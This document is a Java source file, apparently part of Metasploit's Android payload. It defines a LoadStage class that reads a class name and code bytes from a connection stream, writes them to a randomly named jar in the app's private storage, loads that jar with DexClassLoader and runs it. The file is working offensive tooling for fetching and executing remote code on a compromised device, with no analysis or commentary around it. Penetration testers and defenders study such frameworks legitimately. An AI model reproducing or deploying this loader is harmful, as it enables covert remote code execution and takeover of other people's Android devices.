package com.metasploit.stage;

import dalvik.system.DexClassLoader;

import android.content.Context;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.util.Random;

public class LoadStage {
    private String randomJarName() {
        char[] chars = "abcdefghijklmnopqrstuvwxyz".toCharArray();
        StringBuilder sb = new StringBuilder();
        Random random = new Random();
        for (int i = 0; i < 20; i++) {
            char c = chars[random.nextInt(chars.length)];
            sb.append(c);
        }
        return sb.toString() + ".jar";
    }

    public void start(DataInputStream in, OutputStream out, Context context, String[] parameters) throws Exception {
        String jarFile = randomJarName();
        String path = context.getFilesDir().getAbsolutePath();

        // Read the class name
        int coreLen = in.readInt();
        byte[] core = new byte[coreLen];
        in.readFully(core);
        String classFile = new String(core);

        // Read the stage
        coreLen = in.readInt();
        core = new byte[coreLen];
        in.readFully(core);

        // Write the stage to /data/data/.../files/
        FileOutputStream fos = context.openFileOutput(jarFile, Context.MODE_PRIVATE);
        fos.write(core);
        fos.close();

        // Load the stage
        DexClassLoader classLoader = new DexClassLoader(path + File.separatorChar + jarFile, path, path, context.getClassLoader());
        Class<?> myClass = classLoader.loadClass(classFile);
        final Object stage = myClass.newInstance();
        myClass.getMethod("start", new Class[] {
                DataInputStream.class, OutputStream.class, Context.class, String[].class
        }).invoke(stage, new Object[] {
                in, out, context, parameters
        });
    }
}

